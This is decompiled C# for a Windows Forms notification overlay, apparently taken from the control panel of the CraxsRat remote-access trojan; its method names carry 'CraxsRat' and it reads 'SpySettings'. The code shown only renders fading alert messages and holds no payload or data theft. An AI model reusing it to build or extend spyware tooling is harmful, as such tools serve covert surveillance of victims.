using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000AA RID: 170
[DesignerGenerated]
public partial class Report : Form
{
	// Token: 0x17000107 RID: 263
	// (get) Token: 0x0600072E RID: 1838 RVA: 0x000AECF4 File Offset: 0x000ACEF4
	// (set) Token: 0x0600072F RID: 1839 RVA: 0x000AED0C File Offset: 0x000ACF0C
	public virtual BackgroundWorker Bgworker
	{
		[CompilerGenerated]
		get
		{
			return this._Bgworker;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = new DoWorkEventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvvwwedsd);
			BackgroundWorker bgworker = this._Bgworker;
			if (bgworker != null)
			{
				bgworker.DoWork -= value2;
			}
			this._Bgworker = value;
			bgworker = this._Bgworker;
			if (bgworker != null)
			{
				bgworker.DoWork += value2;
			}
		}
	}

	// Token: 0x17000108 RID: 264
	// (get) Token: 0x06000730 RID: 1840 RVA: 0x000AED58 File Offset: 0x000ACF58
	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = base.CreateParams;
			if (!base.DesignMode)
			{
				createParams.ExStyle |= 524288;
			}
			return createParams;
		}
	}

	// Token: 0x06000731 RID: 1841 RVA: 0x000AED8C File Offset: 0x000ACF8C
	public Report()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvwevswefd;
		base.MouseClick += this.Report_MouseClick;
		base.Closing += this.Report_Closing;
		this.ColorBack = Color.Black;
		this.ColorFont = Color.FromArgb(157, 5, 17);
		this.sizeFontHeight = 5;
		this.sizeFontWidth = 5;
		this.sizeHeightSTOP = 9;
		this.timeOut = 15;
		this.InitializeComponent();
	}

	// Token: 0x06000734 RID: 1844 RVA: 0x000AEF20 File Offset: 0x000AD120
	[DebuggerStepThrough]
	private void FadeIn(Form o, int interval = 80)
	{
		Report.VB_0024StateMachine_17_FadeIn vb_0024StateMachine_17_FadeIn = new Report.VB_0024StateMachine_17_FadeIn();
		vb_0024StateMachine_17_FadeIn._0024VB_0024Me = this;
		vb_0024StateMachine_17_FadeIn._0024VB_0024Local_o = o;
		vb_0024StateMachine_17_FadeIn._0024VB_0024Local_interval = interval;
		vb_0024StateMachine_17_FadeIn._0024State = -1;
		vb_0024StateMachine_17_FadeIn._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_17_FadeIn._0024Builder.Start<Report.VB_0024StateMachine_17_FadeIn>(ref vb_0024StateMachine_17_FadeIn);
	}

	// Token: 0x06000735 RID: 1845 RVA: 0x000AEF6C File Offset: 0x000AD16C
	[DebuggerStepThrough]
	private void FadeOut(Form o, int interval = 80)
	{
		Report.VB_0024StateMachine_18_FadeOut vb_0024StateMachine_18_FadeOut = new Report.VB_0024StateMachine_18_FadeOut();
		vb_0024StateMachine_18_FadeOut._0024VB_0024Me = this;
		vb_0024StateMachine_18_FadeOut._0024VB_0024Local_o = o;
		vb_0024StateMachine_18_FadeOut._0024VB_0024Local_interval = interval;
		vb_0024StateMachine_18_FadeOut._0024State = -1;
		vb_0024StateMachine_18_FadeOut._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_18_FadeOut._0024Builder.Start<Report.VB_0024StateMachine_18_FadeOut>(ref vb_0024StateMachine_18_FadeOut);
	}

	// Token: 0x06000736 RID: 1846 RVA: 0x000AEFB8 File Offset: 0x000AD1B8
	public void AddItem(Bitmap img, string Text)
	{
		Report._Closure_0024__19_002D0 CS_0024_003C_003E8__locals0 = new Report._Closure_0024__19_002D0();
		CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_img = img;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_Text = Text;
		Task task = new Task(delegate()
		{
			CS_0024_003C_003E8__locals0._Lambda_0024__0();
		});
		task.RunSynchronously();
		task.Wait();
		task.Dispose();
	}

	// Token: 0x06000737 RID: 1847 RVA: 0x000AF020 File Offset: 0x000AD220
	private object Add(Bitmap img, string Text)
	{
		object syncNotifications = Data.SyncNotifications;
		ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
		lock (syncNotifications)
		{
			if (this.Items.Count >= 60)
			{
				this.Items.RemoveAt(0);
			}
			try
			{
				Notifications item = new Notifications
				{
					FLAG = img,
					TEXT = Text
				};
				this.Items.Add(item);
				if (this.Items.Count > 0 & !this.status)
				{
					this.MyShow();
				}
			}
			catch (InvalidOperationException)
			{
			}
		}
		return null;
	}

	// Token: 0x06000738 RID: 1848 RVA: 0x000AF0D8 File Offset: 0x000AD2D8
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvwevswefd(object sender, EventArgs e)
	{
		this.MeHand = base.Handle;
		this.status = false;
		this.Items = new List<Notifications>();
		checked
		{
			int x = (Operators.CompareString(SpySettings.LOCATION_NOTICETIGHT, "Right", false) != 0) ? 5 : (Screen.PrimaryScreen.WorkingArea.Width - base.Width);
			int y = Screen.PrimaryScreen.WorkingArea.Height - base.Height;
			base.Location = new Point(x, y);
			this.Bgworker = new BackgroundWorker();
			if (!this.Bgworker.IsBusy)
			{
				this.Bgworker.RunWorkerAsync();
			}
		}
	}

	// Token: 0x06000739 RID: 1849 RVA: 0x00003479 File Offset: 0x00001679
	public void MyShow()
	{
		this.status = true;
	}

	// Token: 0x0600073A RID: 1850 RVA: 0x00003482 File Offset: 0x00001682
	public void MyHide()
	{
		this.status = false;
	}

	// Token: 0x0600073B RID: 1851 RVA: 0x000AF184 File Offset: 0x000AD384
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvvwwedsd(object sender, DoWorkEventArgs e)
	{
		List<Notifications>.Enumerator enumerator = default(List<Notifications>.Enumerator);
		checked
		{
			for (;;)
			{
				Thread.Sleep(1);
				try
				{
					Thread.Sleep(25);
					if (this.Items.Count > 0 & this.status)
					{
						try
						{
							object syncNotifications = Data.SyncNotifications;
							ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
							lock (syncNotifications)
							{
								Bitmap bitmap = new Bitmap(base.Width, base.Height);
								Graphics graphics = Graphics.FromImage(bitmap);
								graphics.SmoothingMode = SmoothingMode.AntiAlias;
								graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
								graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
								graphics.CompositingQuality = CompositingQuality.GammaCorrected;
								graphics.CompositingMode = CompositingMode.SourceOver;
								foreach (Notifications notifications in this.Items)
								{
									if (notifications.sizeHeight <= this.sizeHeightSTOP)
									{
										notifications.sizeHeight = this.sizeHeightSTOP;
									}
									else
									{
										int count = this.Items.Count;
										if (count > 60)
										{
											notifications.sizeHeight = this.sizeHeightSTOP;
										}
										else if (count > 20)
										{
											notifications.sizeHeight += -14;
										}
										else if (count > 15)
										{
											notifications.sizeHeight += -8;
										}
										else if (count > 10)
										{
											notifications.sizeHeight += -4;
										}
										else if (count > 5)
										{
											notifications.sizeHeight += -2;
										}
										else
										{
											notifications.sizeHeight += -1;
										}
										if (notifications.sizeHeight <= this.sizeHeightSTOP)
										{
											notifications.sizeHeight = this.sizeHeightSTOP;
										}
									}
									SizeF sizeF = default(SizeF);
									int height = (int)Math.Round((double)(unchecked(graphics.MeasureString(notifications.TEXT, reso.f).Height + (float)this.sizeFontHeight)));
									Rectangle rectangle = new Rectangle(0, notifications.sizeHeight, base.Width, height);
									LinearGradientBrush brush = new LinearGradientBrush(rectangle, this.ColorBack, this.ColorBack, LinearGradientMode.BackwardDiagonal);
									GraphicsPath path = this.RoundRect(rectangle, (Operators.CompareString(SpySettings.NOTI_Round, "Yes", false) != 0) ? 1 : 12);
									graphics.FillPath(brush, path);
									rectangle = new Rectangle(0, notifications.sizeHeight - this.sizeFontHeight, 0, 0);
									ControlPaint.DrawLockedFrame(graphics, rectangle, false);
									object[] array = new object[2];
									array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(notifications.FLAG.Clone()));
									object[] array2 = array;
									Point point = new Point(base.Width - notifications.FLAG.Width - 7, notifications.sizeHeight + this.sizeFontHeight);
									array2[1] = point;
									NewLateBinding.LateCall(graphics, null, "DrawImage", array2, null, null, null, true);
									using (SolidBrush solidBrush = new SolidBrush(this.ColorFont))
									{
										graphics.DrawString(notifications.TEXT, reso.f, solidBrush, (float)this.sizeFontWidth, (float)(notifications.sizeHeight + this.sizeFontHeight));
									}
									if (notifications.sizeHeight > base.Height - 50)
									{
										break;
									}
								}
								try
								{
									for (;;)
									{
										IL_3A5:
										foreach (Notifications notifications2 in this.Items)
										{
											if (!notifications2.startTime)
											{
												notifications2.start = DateTime.Now.AddSeconds((double)this.timeOut);
												notifications2.startTime = true;
											}
											int num = DateTime.Compare(notifications2.start, DateTime.Now);
											if (num < 0)
											{
												this.Items.Remove(notifications2);
												goto IL_3A5;
											}
										}
										break;
									}
								}
								finally
								{
									((IDisposable)enumerator).Dispose();
								}
								if (this.Items.Count == 0 & this.status)
								{
									bitmap = null;
									this.MyHide();
								}
								graphics.Flush(FlushIntention.Sync);
								graphics.Dispose();
								this.UpdateWindow(bitmap);
							}
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x0600073C RID: 1852 RVA: 0x000AF640 File Offset: 0x000AD840
	[DebuggerStepThrough]
	private void Report_MouseClick(object sender, MouseEventArgs e)
	{
		Report.VB_0024StateMachine_25_Report_MouseClick vb_0024StateMachine_25_Report_MouseClick = new Report.VB_0024StateMachine_25_Report_MouseClick();
		vb_0024StateMachine_25_Report_MouseClick._0024VB_0024Me = this;
		vb_0024StateMachine_25_Report_MouseClick._0024VB_0024Local_sender = sender;
		vb_0024StateMachine_25_Report_MouseClick._0024VB_0024Local_e = e;
		vb_0024StateMachine_25_Report_MouseClick._0024State = -1;
		vb_0024StateMachine_25_Report_MouseClick._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_25_Report_MouseClick._0024Builder.Start<Report.VB_0024StateMachine_25_Report_MouseClick>(ref vb_0024StateMachine_25_Report_MouseClick);
	}

	// Token: 0x0600073D RID: 1853 RVA: 0x000AF68C File Offset: 0x000AD88C
	private object AllClear()
	{
		object syncNotifications = Data.SyncNotifications;
		ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
		lock (syncNotifications)
		{
			this.Items.Clear();
			this.BitmapClean();
			this.MyHide();
		}
		return null;
	}

	// Token: 0x0600073E RID: 1854 RVA: 0x000AF6E8 File Offset: 0x000AD8E8
	public GraphicsPath RoundRect(Rectangle Rectangle, int Curve)
	{
		GraphicsPath graphicsPath = new GraphicsPath();
		checked
		{
			graphicsPath.AddArc(Rectangle.X + Rectangle.Width - Curve, Rectangle.Y, Curve, Curve, 270f, 90f);
			graphicsPath.AddArc(Rectangle.X + Rectangle.Width - Curve, Rectangle.Y + Rectangle.Height - Curve, Curve, Curve, 0f, 90f);
			graphicsPath.AddArc(Rectangle.X, Rectangle.Y + Rectangle.Height - Curve, Curve, Curve, 90f, 90f);
			graphicsPath.AddArc(Rectangle.X, Rectangle.Y, Curve, Curve, 180f, 90f);
			graphicsPath.CloseFigure();
			return graphicsPath;
		}
	}

	// Token: 0x0600073F RID: 1855 RVA: 0x000AF7C4 File Offset: 0x000AD9C4
	public void BitmapClean()
	{
		if (!base.IsDisposed && base.Width > 0 && base.Height > 0)
		{
			Bitmap bm = new Bitmap(base.Width, base.Height, PixelFormat.Format32bppPArgb);
			this.UpdateWindow(bm);
		}
	}

	// Token: 0x06000740 RID: 1856 RVA: 0x000AF810 File Offset: 0x000ADA10
	public void UpdateWindow(Bitmap bm)
	{
		if (!base.IsDisposed && base.Width > 0 && base.Height > 0)
		{
			using (Bitmap bitmap = new Bitmap(base.Width, base.Height, PixelFormat.Format32bppPArgb))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.SmoothingMode = SmoothingMode.AntiAlias;
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
					graphics.CompositingQuality = CompositingQuality.GammaCorrected;
					graphics.CompositingMode = CompositingMode.SourceOver;
					if (bm != null)
					{
						graphics.DrawImage(bm, new Rectangle(0, 0, bm.Width, bm.Height));
					}
					IntPtr dc = NativeMethods.GetDC(IntPtr.Zero);
					IntPtr intPtr = NativeMethods.CreateCompatibleDC(dc);
					IntPtr hbitmap = bitmap.GetHbitmap(Color.FromArgb(0));
					IntPtr hObj = NativeMethods.SelectObject(intPtr, hbitmap);
					NativeMethods.BLENDFUNCTION blendfunction = new NativeMethods.BLENDFUNCTION(225);
					Point location = base.Location;
					Size size = bitmap.Size;
					Point empty = Point.Empty;
					NativeMethods.UpdateLayeredWindow(this.MeHand, dc, ref location, ref size, intPtr, ref empty, 0, ref blendfunction, 2);
					NativeMethods.SelectObject(intPtr, hObj);
					NativeMethods.DeleteObject(hbitmap);
					NativeMethods.DeleteDC(intPtr);
					NativeMethods.DeleteDC(dc);
				}
			}
		}
	}

	// Token: 0x06000741 RID: 1857 RVA: 0x000AF964 File Offset: 0x000ADB64
	protected override void OnResize(EventArgs e)
	{
		base.OnResize(e);
		if (base.Created)
		{
			this.UpdateWindow(null);
		}
	}

	// Token: 0x06000742 RID: 1858 RVA: 0x000AF988 File Offset: 0x000ADB88
	protected override void OnLocationChanged(EventArgs e)
	{
		base.OnLocationChanged(e);
		if (base.Created)
		{
			this.UpdateWindow(null);
		}
	}

	// Token: 0x06000743 RID: 1859 RVA: 0x000AF9AC File Offset: 0x000ADBAC
	protected override void OnVisibleChanged(EventArgs e)
	{
		base.OnVisibleChanged(e);
		if (base.Visible)
		{
			this.UpdateWindow(null);
		}
	}

	// Token: 0x06000744 RID: 1860 RVA: 0x000AF9D0 File Offset: 0x000ADBD0
	private void Report_Closing(object sender, CancelEventArgs e)
	{
		if (this.Bgworker != null)
		{
			this.Bgworker.Dispose();
		}
	}

	// Token: 0x04000A7A RID: 2682
	public List<Notifications> Items;

	// Token: 0x04000A7C RID: 2684
	private IntPtr MeHand;

	// Token: 0x04000A7D RID: 2685
	private Color ColorBack;

	// Token: 0x04000A7E RID: 2686
	private Color ColorFont;

	// Token: 0x04000A7F RID: 2687
	private int sizeFontHeight;

	// Token: 0x04000A80 RID: 2688
	private int sizeFontWidth;

	// Token: 0x04000A81 RID: 2689
	private int sizeHeightSTOP;

	// Token: 0x04000A82 RID: 2690
	private int timeOut;

	// Token: 0x04000A83 RID: 2691
	private bool status;

	// Token: 0x020000AE RID: 174
	[CompilerGenerated]
	internal sealed class _Closure_0024__19_002D0
	{
		// Token: 0x06000752 RID: 1874 RVA: 0x000034B0 File Offset: 0x000016B0
		[DebuggerHidden]
		internal void _Lambda_0024__R1()
		{
			this._Lambda_0024__0();
		}

		// Token: 0x06000753 RID: 1875 RVA: 0x000AFD64 File Offset: 0x000ADF64
		internal object _Lambda_0024__0()
		{
			return this._0024VB_0024Me.Add(this._0024VB_0024Local_img, this._0024VB_0024Local_Text);
		}

		// Token: 0x04000A98 RID: 2712
		public Bitmap _0024VB_0024Local_img;

		// Token: 0x04000A99 RID: 2713
		public string _0024VB_0024Local_Text;

		// Token: 0x04000A9A RID: 2714
		public Report _0024VB_0024Me;
	}
}
